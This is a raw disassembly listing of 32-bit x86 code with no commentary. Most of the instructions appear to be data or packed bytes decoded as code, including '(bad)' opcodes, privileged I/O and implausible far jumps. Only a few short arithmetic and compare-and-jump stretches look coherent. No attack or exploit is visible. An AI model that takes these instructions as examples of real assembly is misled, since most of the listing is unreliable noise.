  40b266:	mov    ebp,0x58efda73
  40b26b:	push   0xfffffffb
  40b26d:	pushf  
  40b26e:	pop    eax
  40b26f:	sbb    ebx,DWORD PTR [edx]
  40b271:	mov    ah,0x68
  40b273:	jecxz  0x40b20b
  40b275:	sbb    bl,BYTE PTR [edi+esi*1+0x34cad8ac]
  40b27c:	dec    edi
  40b27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b27e:	daa    
  40b27f:	data16 jae 0x40b25e
  40b282:	test   al,0xb6
  40b284:	add    eax,0x9f6cf36e
  40b289:	in     al,dx
  40b28a:	xor    al,0x3a
  40b28c:	xor    ecx,DWORD PTR [ecx-0x496c7201]
  40b292:	or     ecx,DWORD PTR [ebx+0x632ce849]
  40b298:	jle    0x40b27d
  40b29a:	arpl   ax,cx
  40b29c:	iret   
  40b29d:	or     edx,DWORD PTR ds:0xa4fb6c1c
  40b2a3:	jg     0x40b240
  40b2a5:	pop    edx
  40b2a6:	jnp    0x40b273
  40b2a8:	sbb    eax,0xcd301aae
  40b2ad:	xor    ebx,DWORD PTR [esi+0x3]
  40b2b0:	push   ebx
  40b2b1:	cmp    dh,BYTE PTR [ecx*8-0x238c47d9]
  40b2b8:	ss lock cwde 
  40b2bb:	leave  
  40b2bc:	add    DWORD PTR [ecx+0x540cbc20],ebp
  40b2c2:	jo     0x40b280
  40b2c4:	or     BYTE PTR [ebx+0xabc66bd],dl
  40b2ca:	and    esi,DWORD PTR [esi+0x2ac4e65d]
  40b2d0:	std    
  40b2d1:	fucom  st(1)
  40b2d3:	push   edx
  40b2d4:	loop   0x40b2c3
  40b2d6:	push   esi
  40b2d7:	cmp    edi,DWORD PTR [ecx]
  40b2d9:	dec    eax
  40b2da:	pop    DWORD PTR [edi+0xf8b2bb3]
  40b2e0:	add    BYTE PTR [eax],ah
  40b2e2:	mov    BYTE PTR [eax+0x33e50124],dl
  40b2e8:	cmc    
  40b2e9:	repz clc 
  40b2eb:	push   ebp
  40b2ec:	dec    ebx
  40b2ed:	fwait
  40b2ee:	inc    ebp
  40b2ef:	adc    DWORD PTR [ecx],ecx
  40b2f1:	cmc    
  40b2f2:	sar    BYTE PTR [eax+0x361a17e1],1
  40b2f8:	call   FWORD PTR [edi+eax*2]
  40b2fb:	xlat   BYTE PTR ds:[ebx]
  40b2fc:	pop    eax
  40b2fd:	dec    ecx
  40b2fe:	add    al,al
  40b300:	stos   DWORD PTR es:[edi],eax
  40b301:	xor    DWORD PTR [eax-0x2cbd7d3e],edx
  40b307:	fs and eax,0xcf36ce26
  40b30d:	mov    ah,0x83
  40b30f:	int    0x6a
  40b311:	pushf  
  40b312:	jge    0x40b383
  40b314:	loope  0x40b330
  40b316:	jmp    0x40b38b
  40b318:	mov    al,0x26
  40b31a:	pop    ebx
  40b31b:	dec    ecx
  40b31c:	or     ebp,eax
  40b31e:	mov    cs,esi
  40b320:	imul   ebx,DWORD PTR [edi+0x5ab6386d],0xa352f76b
  40b32a:	adc    DWORD PTR [edi+0x66],eax
  40b32d:	jge    0x40b334
  40b32f:	popf   
  40b330:	retf   0xbbfc
  40b333:	inc    eax
  40b334:	pop    esi
  40b335:	sbb    eax,0x89a87491
  40b33a:	fild   DWORD PTR [eax-0x21]
  40b33d:	stc    
  40b33e:	lock daa 
  40b340:	rcr    BYTE PTR [esi],1
  40b342:	sbb    DWORD PTR [ebx-0x26845d6a],eax
  40b348:	mov    DWORD PTR [edx+0x3f6973c8],edi
  40b34e:	mov    al,0x6d
  40b350:	leave  
  40b351:	cmp    BYTE PTR [esi],dl
  40b353:	mov    esp,0x49275d44
  40b358:	push   ss
  40b359:	repnz nop
  40b35b:	mov    ch,0xa2
  40b35d:	mov    dl,0x79
  40b35f:	aad    0x45
  40b361:	add    ah,0xd2
  40b364:	ds test eax,0x2bc18eab
  40b36a:	push   eax
  40b36b:	xchg   ebp,eax
  40b36c:	xchg   bl,ah
  40b36e:	(bad)  
  40b36f:	sbb    BYTE PTR [edi+0xb],bh
  40b372:	rcl    BYTE PTR [ebp-0x47],1
  40b375:	push   eax
  40b376:	mov    bl,0x40
  40b378:	jmp    0x40b379
  40b37a:	jg     0x40b3df
  40b37c:	lock sub eax,ecx
  40b37f:	or     ebp,DWORD PTR [eax-0x698308e9]
  40b385:	push   edi
  40b386:	cdq    
  40b387:	sbb    eax,DWORD PTR [ebx+0x1ac3493c]
  40b38d:	rcr    dh,1
  40b38f:	mov    cl,0x57
  40b391:	adc    bh,dh
  40b393:	pop    ecx
  40b394:	fmul   DWORD PTR ds:0x69a10b55
  40b39a:	jno    0x40b3df
  40b39c:	pop    ss
  40b39d:	int3   
  40b39e:	pop    esp
  40b39f:	adc    bh,BYTE PTR [ebp-0x226482c6]
  40b3a5:	nop
  40b3a6:	mov    BYTE PTR [ecx+0x4f3d5f34],dl
  40b3ac:	and    cl,bh
  40b3ae:	popa   
  40b3af:	jmp    0x13b37a8f
  40b3b4:	mov    bh,0xd3
  40b3b6:	ror    BYTE PTR [ecx-0x23],0x96
  40b3ba:	and    bl,BYTE PTR [eax]
  40b3bc:	mov    eax,ds:0xba84c797
  40b3c1:	aas    
  40b3c2:	dec    esi
  40b3c3:	or     eax,DWORD PTR gs:[eax-0x5c]
  40b3c7:	add    eax,0xe7b9d937
  40b3cc:	xchg   esi,eax
  40b3cd:	pop    edx
  40b3ce:	cmp    eax,0xb19d0f57
  40b3d3:	(bad)  
  40b3d4:	xor    BYTE PTR [esi+eax*4+0x21],dl
  40b3d8:	xor    al,0x4e
  40b3da:	out    0xc4,eax
  40b3dc:	sub    esp,DWORD PTR [edi+0x23]
  40b3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e0:	fdivr  QWORD PTR [ecx-0x1e]
  40b3e3:	adc    eax,0xe88f4b86
  40b3e8:	pushf  
  40b3e9:	popf   
  40b3ea:	out    0x2,al
  40b3ec:	dec    esi
  40b3ed:	sub    BYTE PTR [esi+0x4051f33d],0x5e
  40b3f4:	ret    
  40b3f5:	mov    ebp,DWORD PTR [eax-0x69]
  40b3f8:	jns    0x40b469
  40b3fa:	fs jecxz 0x40b39d
  40b3fd:	out    dx,eax
  40b3fe:	aaa    
  40b3ff:	test   eax,0x63924922
  40b404:	aad    0x67
  40b406:	in     eax,0x9d
  40b408:	lds    ebp,FWORD PTR [esi-0x52c168f2]
  40b40e:	inc    ecx
  40b40f:	xor    al,0xcb
  40b411:	mov    WORD PTR [edi],es
  40b413:	es inc eax
  40b415:	aam    0xff
  40b417:	ret    0xd825
  40b41a:	mov    edx,0x87353dd1
  40b41f:	cmp    BYTE PTR [eax],0x33
  40b422:	or     ebx,DWORD PTR [esi-0x2b156b48]
  40b428:	push   es
  40b429:	mov    cl,0x89
  40b42b:	dec    eax
  40b42c:	imul   edi,DWORD PTR [edx+0x36],0x742112bf
  40b433:	shl    BYTE PTR [ecx],cl
  40b435:	aam    0xe7
  40b437:	arpl   WORD PTR [edi-0x48],di
  40b43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43b:	adc    ah,ch
  40b43d:	ret    0x3285
  40b440:	and    DWORD PTR [eax],0x50
  40b443:	or     DWORD PTR [edi+0x1d],ebp
  40b446:	(bad)  
  40b447:	out    0xf0,eax
  40b449:	int    0x9a
  40b44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44c:	inc    eax
  40b44d:	xchg   edx,eax
  40b44e:	(bad)  
  40b44f:	xchg   edx,eax
  40b450:	xchg   esp,eax
  40b451:	cmc    
  40b452:	cdq    
  40b453:	sti    
  40b454:	cmp    bh,BYTE PTR [ebx]
  40b456:	cmp    eax,0xdbeb2df3
  40b45b:	call   0x1fc86857
  40b460:	add    esi,DWORD PTR [edi+0x7a]
  40b463:	xor    esi,DWORD PTR [edx]
  40b465:	jno    0x40b494
  40b467:	inc    edx
  40b468:	js     0x40b473
  40b46a:	mov    ecx,0x1aa1a7a4
  40b46f:	lahf   
  40b470:	(bad)  
  40b471:	adc    DWORD PTR [edi],ebp
  40b473:	js     0x40b464
  40b475:	sbb    edi,esi
  40b477:	jns    0x40b4a9
  40b479:	mov    cl,0xb
  40b47b:	jae    0x40b4cd
  40b47d:	ficomp DWORD PTR [edi]
  40b47f:	push   esp
  40b480:	mov    ah,0x7c
  40b482:	inc    edx
  40b483:	lock mov ch,0x1c
  40b486:	and    BYTE PTR [esi+eax*8-0x67],ch
  40b48a:	(bad)  
  40b48b:	sub    al,0x2
  40b48d:	ins    WORD PTR es:[edi],dx
  40b48f:	outs   dx,BYTE PTR ds:[esi]
  40b490:	cvtps2pd xmm2,QWORD PTR [ebx-0xdf52d69]
  40b497:	or     ebx,DWORD PTR ds:0xc9cef445
  40b49d:	sar    DWORD PTR [ebx],cl
  40b49f:	cmp    eax,DWORD PTR [ebp-0x6f]
  40b4a2:	arpl   WORD PTR [ecx+0x5309c45a],cx
  40b4a8:	mov    dl,BYTE PTR [eax+ebx*8+0x12]
  40b4ac:	and    ecx,esp
  40b4ae:	pop    edx
  40b4af:	cdq    
  40b4b0:	(bad)  
  40b4b1:	push   ebx
  40b4b2:	(bad)
  40b4b6:	mov    eax,ds:0xb0a1526
  40b4bb:	mov    bl,0xc0
  40b4bd:	cld    
  40b4be:	sub    ch,BYTE PTR [eax+edx*4+0x1b54b09d]
  40b4c5:	jge    0x40b488
  40b4c7:	stc    
  40b4c8:	sar    BYTE PTR [edx-0x1b],1
  40b4cb:	mov    ch,0xd4
  40b4cd:	mul    DWORD PTR [eax+0x74601182]
  40b4d3:	(bad)  
  40b4d4:	and    al,0xf1
  40b4d6:	jecxz  0x40b4f8
  40b4d8:	into   
  40b4d9:	gs gs push ebx
  40b4dc:	sbb    al,0x8f
  40b4de:	es pushf 
  40b4e0:	sub    DWORD PTR [esi+0x5a15d3cc],ebp
  40b4e6:	mov    ds:0x767355a8,eax
  40b4eb:	hlt    
  40b4ec:	fwait
  40b4ed:	shr    BYTE PTR [edi-0x56f4cc74],0x78
  40b4f4:	popa   
  40b4f5:	push   0xc7b39d6e
  40b4fa:	cli    
  40b4fb:	(bad)  
  40b4fd:	ffreep st(6)
  40b4ff:	or     eax,0x764e8818
  40b504:	rcl    DWORD PTR [ebx-0x79],1
  40b507:	das    
  40b508:	pop    ds
  40b509:	rcl    eax,0x9f
  40b50c:	out    dx,eax
  40b50d:	dec    edi
  40b50e:	lock add al,0xb8
  40b511:	div    BYTE PTR [ecx*4+0x4fe32c51]
  40b518:	mul    DWORD PTR [ebx-0x58]
  40b51b:	push   0xffffffc7
  40b51d:	imul   esp,DWORD PTR [ebx+0x65],0xf
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	add    dl,dh
  40b551:	add    ebp,DWORD PTR [esi]
  40b553:	rol    DWORD PTR [esi+0x7d9f7070],0x70
  40b55a:	jo     0x40b593
  40b55c:	ffreep st(6)
  40b55e:	retf   0xc2bd
  40b561:	nop
  40b562:	aam    0x98
  40b564:	fsub   QWORD PTR [eax]
  40b566:	push   ss
  40b567:	xor    ebx,DWORD PTR [edi]
  40b569:	aas    
  40b56a:	lahf   
  40b56b:	sbb    ecx,DWORD PTR [eax]
  40b56d:	lods   eax,DWORD PTR ds:[esi]
  40b56e:	push   ecx
  40b56f:	imul   ebx,DWORD PTR [ebx+0x76d55152],0x6b531926
  40b579:	aam    0x94
  40b57b:	out    0x80,eax
  40b57d:	pushf  
  40b57e:	inc    eax
  40b57f:	pop    es
  40b580:	icebp  
  40b581:	rcr    DWORD PTR [edi+ebx*4],1
  40b584:	xchg   esp,eax
  40b585:	repnz xchg ecx,eax
  40b587:	(bad)  
  40b588:	lods   eax,DWORD PTR ds:[esi]
  40b589:	loope  0x40b518
  40b58b:	sbb    dl,BYTE PTR [esi+eax*8]
  40b58e:	stos   DWORD PTR es:[edi],eax
  40b58f:	and    ah,BYTE PTR [esi+0x6d]
  40b592:	ficomp WORD PTR [ebp+0x4dac3be7]
  40b598:	scas   al,BYTE PTR es:[edi]
  40b599:	enter  0xb440,0xbf
  40b59d:	loope  0x40b54e
  40b59f:	xchg   edx,eax
  40b5a0:	mov    ss,WORD PTR [esi+0x7e6ff72f]
  40b5a6:	mov    cl,0xe7
  40b5a8:	cld    
  40b5a9:	mov    ecx,0x1caff94
  40b5ae:	dec    edi
  40b5af:	inc    eax
  40b5b0:	sbb    DWORD PTR [ebp-0x42],0xffffff87
  40b5b4:	xlat   BYTE PTR ds:[ebx]
  40b5b5:	jge    0x40b58f
  40b5b7:	push   ecx
  40b5b8:	push   0x2cc711b8
  40b5bd:	(bad)  
  40b5be:	stc    
  40b5bf:	sbb    DWORD PTR [eax],0xb6edf25f
  40b5c5:	and    eax,0xc7e2b838
  40b5ca:	jge    0x40b5c8
  40b5cc:	sbb    DWORD PTR ds:0x690f51ae,esi
  40b5d2:	jne    0x40b627
  40b5d4:	sbb    al,0x24
  40b5d6:	int3   
  40b5d7:	data16 icebp 
  40b5d9:	push   esi
  40b5da:	icebp  
  40b5db:	mov    bh,0xc7
  40b5dd:	in     eax,dx
  40b5de:	jmp    0x40b62c
  40b5e0:	push   0x38
  40b5e2:	daa    
  40b5e3:	xor    cl,BYTE PTR [edx]
  40b5e5:	xchg   edi,eax
  40b5e6:	jns    0x40b577
  40b5e8:	mov    ecx,DWORD PTR [eax]
  40b5ea:	adc    DWORD PTR [ebx+0x1e],edx
  40b5ed:	cmp    DWORD PTR [ebx-0x39],eax
  40b5f0:	pop    ebx
  40b5f1:	cmp    al,0x8a
  40b5f3:	add    BYTE PTR [edi+0x78],ch
  40b5f6:	mov    ds:0x52cd52ef,al
  40b5fb:	shr    bl,cl
  40b5fd:	xor    al,0xd5
  40b5ff:	stc    
  40b600:	scas   eax,DWORD PTR es:[edi]
  40b601:	push   0xc1be4270
  40b606:	xor    al,0x49
  40b608:	scas   eax,DWORD PTR es:[edi]
  40b609:	icebp  
  40b60a:	fisub  WORD PTR [ecx-0x45]
  40b60d:	push   ss
  40b60e:	(bad)  
  40b60f:	or     dl,ch
  40b611:	jns    0x40b60f
  40b613:	mov    al,0xad
  40b615:	scas   eax,DWORD PTR es:[edi]
  40b616:	into   
  40b617:	push   esi
  40b618:	mov    ah,dl
  40b61a:	stos   BYTE PTR es:[edi],al
  40b61b:	ja     0x40b5d3
  40b61d:	pop    es
  40b61e:	vpsrlq ymm2,ymm2,xmm3
  40b622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b623:	stos   DWORD PTR es:[edi],eax
  40b624:	nop
  40b625:	cmp    esi,DWORD PTR ds:0x137fbc1d
  40b62b:	pop    ebp
  40b62c:	pop    esi
  40b62d:	jns    0x40b684
  40b62f:	gs jnp 0x40b625
  40b632:	dec    eax
  40b633:	mov    dh,0xfe
  40b635:	aad    0x8c
  40b637:	fs out 0xb4,al
  40b63a:	sbb    eax,0x20498e0
  40b63f:	out    0xe9,ax
  40b642:	hlt    
  40b643:	add    BYTE PTR [edx+0x259f610a],0x7f
  40b64a:	sub    esp,DWORD PTR ds:0x98a8b23e
  40b650:	jmp    DWORD PTR [edx-0xc]
  40b653:	sbb    al,0xa6
  40b655:	stos   BYTE PTR es:[edi],al
  40b656:	arpl   WORD PTR [ebp+0x33],bp
  40b659:	iret   
  40b65a:	and    BYTE PTR [ecx+0x6a],al
  40b65d:	(bad)  
  40b65e:	jmp    0x40b5fc
  40b660:	pop    esp
  40b661:	adc    BYTE PTR [eax+0x6f],bl
  40b664:	add    DWORD PTR [ebx-0x7cb8b460],0x77ffe682
  40b66e:	into   
  40b66f:	hlt    
  40b670:	dec    ebp
  40b671:	call   0xb6f0a8e9
  40b676:	stos   BYTE PTR es:[edi],al
  40b677:	ins    BYTE PTR es:[edi],dx
  40b678:	xlat   BYTE PTR ds:[ebx]
  40b679:	sbb    esi,DWORD PTR [edi+0x32eef8a8]
  40b67f:	jge    0x40b60b
  40b681:	out    dx,eax
  40b682:	jnp    0x40b604
  40b684:	xchg   ecx,eax
  40b685:	pop    esp
  40b686:	scas   eax,DWORD PTR es:[edi]
  40b687:	lods   eax,DWORD PTR gs:[esi]
  40b689:	scas   eax,DWORD PTR es:[edi]
  40b68a:	push   edi
  40b68b:	(bad)  
  40b68c:	popf   
  40b68d:	sbb    ecx,DWORD PTR [ecx]
  40b68f:	test   DWORD PTR [ecx-0x6e21829d],ebx
  40b695:	rol    BYTE PTR [ecx+0x48f01987],1
  40b69b:	repz les esp,FWORD PTR [ecx]
  40b69e:	pop    ebp
  40b69f:	and    al,BYTE PTR [edx+0x60fee2d1]
  40b6a5:	mov    BYTE PTR [ebx+0x53],bl
  40b6a8:	mov    al,0xda
  40b6aa:	ds xchg edi,eax
  40b6ac:	(bad)  
  40b6ad:	pop    ds
  40b6ae:	dec    eax
  40b6af:	and    eax,0x376668ab
  40b6b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b5:	jl     0x40b718
  40b6b7:	add    ch,BYTE PTR [eax]
  40b6b9:	call   0xce30:0x2b51d9c1
  40b6c0:	inc    edi
  40b6c1:	add    BYTE PTR [ebp+0x5b],0x34
  40b6c5:	(bad)  
  40b6c6:	fs pop esi
  40b6c8:	aas    
  40b6c9:	inc    esp
  40b6ca:	leave  
  40b6cb:	outs   dx,BYTE PTR ds:[esi]
  40b6cc:	xchg   ecx,eax
  40b6cd:	adc    esi,DWORD PTR [edx-0x2c6921c0]
  40b6d3:	out    dx,eax
  40b6d4:	pop    ebx
  40b6d5:	jecxz  0x40b6a4
  40b6d7:	outs   dx,BYTE PTR ds:[esi]
  40b6d8:	pop    ebx
  40b6d9:	and    al,0x25
  40b6db:	popa   
  40b6dc:	jns    0x40b703
  40b6de:	fs jne 0x40b6a8
  40b6e1:	das    
  40b6e2:	sub    DWORD PTR [edi-0x43],esi
  40b6e5:	add    ecx,ebp
  40b6e7:	pop    ss
  40b6e8:	dec    BYTE PTR [edi]
  40b6ea:	or     dh,BYTE PTR [eax-0x47]
  40b6ed:	stc    
  40b6ee:	jl     0x40b76d
  40b6f0:	mov    dh,0xd9
  40b6f2:	push   ecx
  40b6f3:	pextrw edx,(bad),0xc5
  40b6f5:	xchg   ebp,eax
  40b6f6:	jne    0x40b6c7
  40b6f8:	ror    DWORD PTR [edi-0x14],0x5c
  40b6fc:	push   0xffffffc7
  40b6fe:	sbb    bh,BYTE PTR [ebp+0x25]
  40b701:	mov    BYTE PTR [ebx-0x3918a3f4],bh
  40b707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b708:	cmp    edx,0x6c0c9d3a
  40b70e:	jp     0x40b6d1
  40b710:	mov    bl,0x73
  40b712:	pop    eax
  40b713:	mov    dh,0x34
  40b715:	mov    dh,0xfa
  40b717:	mov    esi,0x21fe7048
  40b71c:	fadd   DWORD PTR [edi]
  40b71e:	daa    
  40b71f:	cmp    eax,0x3fd71c38
  40b724:	(bad)  
  40b725:	es cwde 
  40b727:	ret    0x2dc5
  40b72a:	scas   eax,DWORD PTR es:[edi]
  40b72b:	mov    ebx,0x5d1e2d02
  40b730:	cmp    edi,DWORD PTR [ebx+0x5745ae4e]
  40b736:	mov    bh,0x3c
  40b738:	sbb    dl,dl
  40b73a:	sar    DWORD PTR [edx-0x3a],0xc8
  40b73e:	jno    0x40b73e
  40b740:	inc    ecx
  40b741:	ja     0x40b6fe
  40b743:	imul   esi,DWORD PTR [ecx],0xb45b06ed
  40b749:	pop    ebp
  40b74a:	mov    al,ds:0x450c0d22
  40b74f:	lods   al,BYTE PTR ds:[esi]
  40b750:	cmp    DWORD PTR [ecx],esp
  40b752:	xor    edx,DWORD PTR [ecx+0x6c]
  40b755:	out    dx,eax
  40b756:	(bad)  
  40b757:	mov    fs,WORD PTR [edi+esi*4-0x36]
  40b75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75c:	out    0x1,eax
  40b75e:	shl    BYTE PTR [edx+0x76],0x72
  40b762:	fs test al,0x61
  40b765:	cli    
  40b766:	div    BYTE PTR [ecx-0x442a9ec1]
  40b76c:	jo     0x40b738
  40b76e:	jmp    0x38fd:0xa08c94a2
  40b775:	jmp    0x19aa:0xff74eaf1
  40b77c:	outs   dx,DWORD PTR ds:[esi]
  40b77d:	fwait
  40b77e:	daa    
  40b77f:	ja     0x40b7fc
  40b781:	or     ah,0x3
  40b784:	and    al,0x2a
  40b786:	call   FWORD PTR [eax-0xaaed54b]
  40b78c:	inc    esp
  40b78d:	test   BYTE PTR ds:0x8efb4ec1,dl
  40b793:	ds push cs
  40b795:	xor    eax,ebx
  40b797:	or     eax,0x2bb6f4ff
  40b79c:	cmp    BYTE PTR [eax],0xa8
  40b79f:	push   cs
  40b7a0:	aas    
  40b7a1:	daa    
  40b7a2:	ja     0x40b79b
  40b7a4:	repz popa 
  40b7a6:	dec    ebx
  40b7a7:	cld    
  40b7a8:	cwde   
  40b7a9:	popa   
  40b7aa:	(bad)  
  40b7ac:	cld    
  40b7ad:	push   cs
  40b7ae:	data16 es xor al,0x96
  40b7b2:	inc    esi
  40b7b3:	ins    DWORD PTR es:[edi],dx
  40b7b4:	inc    ecx
  40b7b5:	adc    eax,0xafab6aa6
  40b7ba:	(bad)  
  40b7bb:	in     eax,0xf0
  40b7bd:	loopne 0x40b80a
  40b7bf:	sub    ecx,DWORD PTR [ecx+eiz*2+0x5e]
  40b7c3:	inc    ebp
  40b7c4:	mov    esp,0x6051618b
  40b7c9:	test   al,0x89
  40b7cb:	dec    edi
  40b7cc:	aaa    
  40b7cd:	or     bh,0x97
  40b7d0:	xchg   esi,eax
  40b7d1:	dec    ebp
  40b7d2:	(bad)  
  40b7d3:	fisubr WORD PTR [edi-0x70ff5356]
  40b7d9:	pop    es
  40b7da:	getsec 
  40b7dc:	ss mov ecx,0xda57ecbe
  40b7e2:	scas   al,BYTE PTR es:[edi]
  40b7e3:	stos   BYTE PTR es:[edi],al
  40b7e4:	xchg   esi,eax
  40b7e5:	mov    eax,ds:0x75cc9325
  40b7ea:	jne    0x40b81c
  40b7ec:	int3   
  40b7ed:	fsubr  DWORD PTR [ebp-0x40]
  40b7f0:	pushf  
  40b7f1:	(bad)
  40b7f4:	xchg   BYTE PTR [ecx-0x605abd17],dl
  40b7fa:	fcompp 
  40b7fc:	sbb    BYTE PTR [edx+0x1b7fda03],bh
  40b802:	mov    edi,0xf43d5b74
  40b807:	pop    ss
  40b808:	mov    esp,0x4a95e03
  40b80d:	and    al,0x5f
  40b80f:	xchg   esp,eax
  40b810:	and    bh,BYTE PTR [edi]
  40b812:	outs   dx,BYTE PTR ds:[esi]
  40b813:	test   eax,0xa45a533d
  40b818:	in     al,0x14
  40b81a:	dec    edi
  40b81b:	jmp    FWORD PTR [esi]
  40b81d:	lods   al,BYTE PTR ds:[esi]
  40b81e:	test   DWORD PTR [edx-0x16577d44],ecx
  40b824:	push   eax
  40b825:	push   edi
  40b826:	push   edi
  40b827:	xor    eax,0x66a9a90c
  40b82c:	sub    ebp,ebp
  40b82e:	retf   
  40b82f:	sub    eax,0xf996b686
  40b834:	lock mov ebp,0x8c099fe0
  40b83a:	dec    eax
  40b83b:	mov    dh,0x29
  40b83d:	push   esp
  40b83e:	sub    esi,edi
  40b840:	xor    BYTE PTR [ebx+0x7],ch
  40b843:	mov    al,0xbf
  40b845:	fnstcw WORD PTR [edx+0x497b6377]
  40b84b:	sub    cl,al
  40b84d:	pop    esi
  40b84e:	pop    esp
  40b84f:	pushf  
  40b850:	lahf   
  40b851:	pop    esi
  40b852:	jo     0x40b7fa
  40b854:	leave  
  40b855:	add    al,0x7e
  40b857:	or     al,ch
  40b859:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b85b:	mov    al,ds:0x67d522e
  40b860:	(bad)  
  40b861:	push   cs
  40b862:	call   0x775353ce
  40b867:	outs   dx,BYTE PTR ds:[esi]
  40b868:	jmp    0x958a:0xdbbcdfd5
  40b86f:	jb     0x40b8ce
  40b871:	repz inc edx
  40b873:	xchg   ebp,eax
  40b874:	dec    esi
  40b875:	fstp   TBYTE PTR [ebx+ebp*1-0x6e]
  40b879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b87a:	ins    BYTE PTR es:[edi],dx
  40b87b:	adc    esi,DWORD PTR [esi-0x1fd256fb]
  40b881:	in     eax,dx
  40b882:	jno    0x40b854
  40b884:	mov    BYTE PTR [edx-0x6b48f45c],0xf3
  40b88b:	in     al,0xed
  40b88d:	mov    ebx,0xbd2845f1
  40b892:	or     al,0x98
  40b894:	cs inc ebp
  40b896:	mov    esp,edx
  40b898:	pop    esi
  40b899:	rcl    DWORD PTR ds:0x15f44c0d,1
  40b89f:	clc    
  40b8a0:	cwde   
  40b8a1:	mov    esp,0xde12342d
  40b8a6:	inc    esp
  40b8a7:	ret    0x1a56
  40b8aa:	ret    
  40b8ab:	cdq    
  40b8ac:	push   esi
  40b8ad:	nop
  40b8ae:	popf   
  40b8af:	aas    
  40b8b0:	jae    0x40b8f2
  40b8b2:	jbe    0x40b933
  40b8b4:	xor    dl,bl
  40b8b6:	clc    
  40b8b7:	test   al,0x9c
  40b8b9:	mov    al,BYTE PTR [ebx+ecx*2-0x16]
  40b8bd:	push   esp
  40b8be:	fwait
  40b8bf:	sbb    ah,BYTE PTR [ebp+esi*4-0x51]
  40b8c3:	jb     0x40b8c1
  40b8c5:	in     eax,0x7a
  40b8c7:	dec    ebp
  40b8c8:	daa    
  40b8c9:	loopne 0x40b8ff
  40b8cb:	pop    eax
  40b8cc:	pop    ss
  40b8cd:	jmp    0xb3fd6444
  40b8d2:	rcr    DWORD PTR [eax-0x4a],1
  40b8d5:	jp     0x40b8db
  40b8d7:	pop    ecx
  40b8d8:	call   0xe127:0x2fcd89cf
  40b8df:	cmp    eax,0x5a9394fa
  40b8e4:	es hlt 
  40b8e6:	lahf   
  40b8e7:	push   edx
  40b8e8:	daa    
  40b8e9:	dec    ebp
  40b8ea:	push   ds
  40b8eb:	mov    ds:0xe99bfab4,eax
  40b8f0:	jne    0x40b8af
  40b8f2:	test   al,0xa7
  40b8f4:	test   DWORD PTR [eax+ebp*2-0x5],ebp
  40b8f8:	sar    BYTE PTR [eax+0x7d8ba0bb],1
  40b8fe:	cld    
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x59166fb],cl
  40b949:	push   esi
  40b94a:	add    al,0x60
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9a7
  40b954:	daa    
  40b955:	jo     0x40b953
  40b957:	sub    ebx,DWORD PTR [edx]
  40b959:	mov    dl,0x30
  40b95b:	pop    esp
  40b95c:	out    0x1d,al
  40b95e:	dec    eax
  40b95f:	dec    edi
  40b960:	ins    DWORD PTR es:[edi],dx
  40b961:	lods   al,BYTE PTR ds:[esi]
  40b962:	mov    cl,0x9
  40b964:	push   ss
  40b965:	jbe    0x40b99b
  40b967:	mov    ch,0x47
  40b969:	sbb    al,BYTE PTR ss:[eax-0x46d03ae8]
  40b970:	shl    DWORD PTR [edi+ecx*1+0x5de3cd3e],0x50
  40b978:	pop    ds
  40b979:	outs   dx,BYTE PTR ds:[esi]
  40b97a:	clc    
  40b97b:	or     BYTE PTR [edi+0x2b2c87b8],dh
  40b981:	jo     0x40b9a1
  40b983:	jnp    0x40b9d4
  40b985:	xor    DWORD PTR ds:0xc25e9caa,esi
  40b98b:	int    0xd0
  40b98d:	shl    BYTE PTR [edx-0x4a],0x53
  40b991:	mov    ebx,0x3f650f83
  40b996:	mov    al,ds:0x8a335c61
  40b99b:	jno    0x40b9c4
  40b99d:	inc    ecx
  40b99e:	lods   eax,DWORD PTR ds:[esi]
  40b99f:	dec    esp
  40b9a0:	xchg   ebp,eax
  40b9a1:	lock lds eax,FWORD PTR [eax+0x39fbee68]
  40b9a8:	push   edi
  40b9a9:	mov    ebx,ebp
  40b9ab:	jp     0x40b97f
  40b9ad:	and    eax,0xf5360672
  40b9b2:	adc    al,0xae
  40b9b4:	fiadd  DWORD PTR [esi-0x31]
  40b9b7:	sbb    esp,DWORD PTR ds:0x555b818f
